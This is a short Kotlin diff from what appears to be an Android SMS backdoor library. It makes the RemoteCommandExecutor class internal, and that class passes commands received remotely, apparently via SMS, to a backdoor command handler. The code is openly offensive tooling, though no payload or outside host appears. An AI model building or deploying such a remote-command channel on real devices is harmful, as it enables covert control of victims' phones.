@@ -37,7 +37,7 @@ import com.evilthreads.wakeservicelib.WakeService
 ............\..............(
 ..............\.............\...
 */
-class RemoteCommandExecutor: WakeService("RemoteCommandExecutor"){
+internal class RemoteCommandExecutor: WakeService("RemoteCommandExecutor"){
     override fun Intent.doWork(){
         getStringExtra(SmsBackdoor.KEY_REMOTE_COMMAND)?.let { command -> SmsBackdoor.commandHandler?.invoke(command) }
     }
